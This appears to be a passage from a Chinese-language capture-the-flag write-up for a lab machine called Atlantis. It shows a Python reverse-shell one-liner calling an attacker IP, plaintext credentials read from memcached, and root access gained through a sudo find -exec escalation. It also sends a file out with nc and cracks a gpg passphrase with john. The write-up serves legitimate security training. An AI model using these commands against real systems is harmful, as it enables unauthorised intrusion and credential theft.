tomcat   21310  0.0  0.3  38456  3616 ?        R    09:04   0:00 ps aux
root     21311  0.0  0.4  47220  4436 ?        R    09:04   0:00 /lib/systemd/systemd-udevd
root     21312  0.0  0.3  47220  4008 ?        R    09:04   0:00 /lib/systemd/systemd-udevd
root     21313  0.0  0.3  47220  3816 ?        R    09:04   0:00 /lib/systemd/systemd-udevd
root     21314  0.0  0.3  47220  3816 ?        R    09:04   0:00 /lib/systemd/systemd-udevd
root     21315  0.0  0.0      0     0 ?        Z    09:04   0:00 [systemd-udevd] <defunct>
root     21316  0.0  0.3  47220  3880 ?        R    09:04   0:00 /lib/systemd/systemd-udevd
www-data 26420  0.0  1.0 344720 10684 ?        S    06:59   0:00 /usr/sbin/apache2 -k start
www-data 26491  0.0  1.0 344656 10620 ?        S    06:59   0:00 /usr/sbin/apache2 -k start
www-data 26530  0.0  1.0 344664 10632 ?        S    06:59   0:00 /usr/sbin/apache2 -k start
root     28143  0.0  0.0      0     0 ?        I    08:39   0:01 [kworker/0:1]
www-data 31112  0.0  1.0 344656 10620 ?        S    07:04   0:00 /usr/sbin/apache2 -k start
www-data 31113  0.0  1.0 344656 10620 ?        S    07:04   0:00 /usr/sbin/apache2 -k start
www-data 31130  0.0  1.0 344720 10684 ?        S    07:04   0:00 /usr/sbin/apache2 -k start
www-data 31131  0.0  1.0 344656 10620 ?        S    07:04   0:00 /usr/sbin/apache2 -k start
www-data 31132  0.0  1.0 344656 10620 ?        S    07:04   0:00 /usr/sbin/apache2 -k start
root     32627  0.0  0.0      0     0 ?        I    07:38   0:00 [kworker/u2:2]
```

```bash
memcache   810  0.0  0.4 425800  4128 ?        Ssl  06:34   0:04 /usr/bin/memcached -m 64 -p 11211 -u memcache -l 127.0.0.1
```

telnet 127.0.0.1 11211

发现蚁剑终端不好用

懒得反弹上传shell了直接用终端反弹shell

```bash
python -c 'import socket,os,pty;s=socket.socket();s.connect(("172.16.55.210",4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn("/bin/sh")'
```

```bash
┌──(root㉿kali)-[/home/kali/Desktop/hmv/aqua]
└─# nc -lvvp 4444
listening on [any] 4444 ...
172.16.52.195: inverse host lookup failed: Host name lookup failure
connect to [172.16.55.210] from (UNKNOWN) [172.16.52.195] 47118
/bin/sh: 0: can't access tty; job control turned off
$ whoami
tomcat

python3 -c 'import pty; pty.spawn("/bin/bash")'
$ python3 -c 'import pty; pty.spawn("/bin/bash")'                    
python3 -c 'import pty; pty.spawn("/bin/bash")'                      
tomcat@Atlantis:/$ 


tomcat@Atlantis:/$ telnet 127.0.0.1 11211
telnet 127.0.0.1 11211
Trying 127.0.0.1...
Connected to 127.0.0.1.
Escape character is '^]'.
ERROR

get username
get username
VALUE username 0 8
tridente
END
get password
get password
VALUE password 0 18
N3ptun0D10sd3lM4r$
```

```bash
┌──(root㉿kali)-[/home/kali/Desktop/hmv/aqua]
└─# ssh tridente@172.16.52.195                                          
The authenticity of host '172.16.52.195 (172.16.52.195)' can't be established.
ED25519 key fingerprint is SHA256:0AywQESzfZyECG/0KTquKNzvJNE23REqvogOSySwo54.
This key is not known by any other names.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '172.16.52.195' (ED25519) to the list of known hosts.
tridente@172.16.52.195's password: 
Welcome to Ubuntu 18.04.5 LTS (GNU/Linux 4.15.0-143-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

  System information as of Wed Dec 10 09:19:33 UTC 2025

  System load:  0.0                Processes:             127
  Usage of /:   29.9% of 14.70GB   Users logged in:       0
  Memory usage: 51%                IP address for enp0s3: 172.16.52.195
  Swap usage:   0%


181 packages can be updated.
113 updates are security updates.


Last login: Wed Mar 16 20:53:29 2022 from 192.168.0.55
tridente@Atlantis:~$ 

```

# tridente提权
```bash
tridente@Atlantis:~$ sudo -l
[sudo] password for tridente: 
Matching Defaults entries for tridente on Atlantis:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User tridente may run the following commands on Atlantis:
    (root) /home/tridente/find
```

find特权

```bash
tridente@Atlantis:~$ sudo /home/tridente/find . -exec /bin/bash \;
root@Atlantis:~# 
```

```bash
root@Atlantis:~# cat user.txt 
Bien echo ya tienes el tridente

flag --> f506a6ee37275430ac07caa95914aeba
```

```bash
nc 172.16.55.210 5555 < root.txt.gpg 
nc -lvnp 5555 > root.txt.gpg 
```

> gpg 是什么
>
> ###### ChatGPT 说：
> `gpg` 是 **GNU Privacy Guard** 的缩写，是 Linux/Unix 下非常常用的 **加密和签名工具**，用来保护文件或通信内容的安全。它基于 **PGP（Pretty Good Privacy）** 标准。
>

```bash
┌──(root㉿kali)-[/home/kali/Desktop/hmv/aqua]
└─# gpg2john root.txt.gpg > flag_hash

File root.txt.gpg
                                                                                                                                                                
┌──(root㉿kali)-[/home/kali/Desktop/hmv/aqua]
└─# john flag_hash -w=/usr/share/wordlists/rockyou.txt
Using default input encoding: UTF-8
Loaded 1 password hash (gpg, OpenPGP / GnuPG Secret Key [32/64])
Cost 1 (s2k-count) is 41943040 for all loaded hashes
Cost 2 (hash algorithm [1:MD5 2:SHA1 3:RIPEMD160 8:SHA256 9:SHA384 10:SHA512 11:SHA224]) is 2 for all loaded hashes
Cost 3 (cipher algorithm [1:IDEA 2:3DES 3:CAST5 4:Blowfish 7:AES128 8:AES192 9:AES256 10:Twofish 11:Camellia128 12:Camellia192 13:Camellia256]) is 9 for all loaded hashes
Will run 4 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
arthur           (?)     
1g 0:00:00:13 DONE (2025-12-10 19:58) 0.07220g/s 103.3p/s 103.3c/s 103.3C/s bernard..12345a
Use the "--show" option to display all of the cracked passwords reliably
Session completed. 

```

爆破得出来密码

```bash
gpg root.txt.gpg
```

```bash
Bien hecho Arthur eres el nuevo Rey de la Atlantida

flag --> e16957fbc9202932b1dc7fe3e10a197e
```







